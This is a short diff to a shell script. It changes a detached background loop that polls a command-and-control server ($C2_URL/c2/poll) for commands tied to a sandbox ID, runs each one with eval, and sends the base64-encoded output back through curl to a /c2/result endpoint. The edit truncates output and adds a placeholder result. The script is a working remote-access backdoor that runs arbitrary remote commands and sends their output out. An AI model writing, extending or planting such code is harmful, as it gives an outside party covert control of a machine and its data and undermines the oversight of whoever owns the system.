@@ -66,7 +66,9 @@ setsid sh -c '
     CMD=$(curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
       "'"$C2_URL"'/c2/poll?id='"$SANDBOX_ID"'" 2>/dev/null)
     if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
-      RESULT=$(eval "$CMD" 2>&1 | base64 -w0 2>/dev/null || eval "$CMD" 2>&1 | base64 2>/dev/null)
+      OUT=$(eval "$CMD" 2>&1)
+      [ -z "$OUT" ] && OUT="(ok)"
+      RESULT=$(printf "%.4000s" "$OUT" | base64 -w0 2>/dev/null || printf "%.4000s" "$OUT" | base64 2>/dev/null)
       curl -s -m 10 -G -H "Bypass-Tunnel-Reminder: true" \
         --data-urlencode "r=$RESULT" \
         "'"$C2_URL"'/c2/result?id='"$SANDBOX_ID"'" >/dev/null 2>&1
